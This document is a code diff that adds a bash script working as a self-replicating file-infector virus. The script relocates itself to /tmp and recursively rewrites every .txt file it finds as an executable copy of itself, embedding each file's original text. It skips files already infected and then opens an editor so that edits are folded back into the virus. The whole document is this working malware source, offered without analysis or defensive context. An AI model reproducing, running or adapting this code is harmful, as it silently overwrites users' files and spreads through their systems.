@@ -1,0 +1,57 @@
+#!/usr/bin/env -S bash 
+
+script_file=$(readlink -f $0)
+text_file_dir=$(dirname ${script_file})
+script_filename=$(basename ${script_file})
+
+mv -f ${script_file} /tmp/${script_filename}
+
+tmp_filename="${script_filename}"
+text_file="${text_file_dir}/${tmp_filename}"
+
+function infect_file()
+{
+	source_file=$1
+	file=$2
+	_old_data=$3
+	_new_data=$4
+	echo _old_data=${_old_data}
+	echo _new_data=${_new_data}
+	tmp_infected="/tmp/$(uuidgen)"
+	cat ${source_file} > ${tmp_infected}
+	python3 -c "_old_data='''${_old_data}''';_new_data='''${_new_data}''';exit(0) if len(_old_data) == 0 else 0;data=open('${tmp_infected}', 'r').read();data=data.replace(_old_data,_new_data);open('${tmp_infected}','w').write(data);"
+	cat ${tmp_infected} > ${file}
+	chmod +x ${file}
+}
+
+cat > ${text_file} << EOM
+123456
+EOM
+
+old_data=$(cat ${text_file})
+
+# for filename in ./*.txt 
+for filename in $(find . -name '*.txt' | grep -v ${script_filename}) 
+do
+	echo scanning ${filename}
+	echo $(cat ${filename} | head -n 1 | head -c 14 | tail -c 3)
+	if [[ $(cat ${filename} | head -n 1 | head -c 14 | tail -c 3) == "env" ]] 
+	then
+		echo continuing
+		continue
+	fi
+	_data=$(cat ${filename})
+	infect_file /tmp/${script_filename} ${filename} "${old_data}" "${_data}"
+done
+
+
+mousepad ${text_file}
+# gedit ${text_file}
+# xdg-open ${tmp_file}
+
+new_data=$(cat ${text_file})
+
+infect_file /tmp/${script_filename} ${text_file} "${old_data}" "${new_data}"
+
+
+
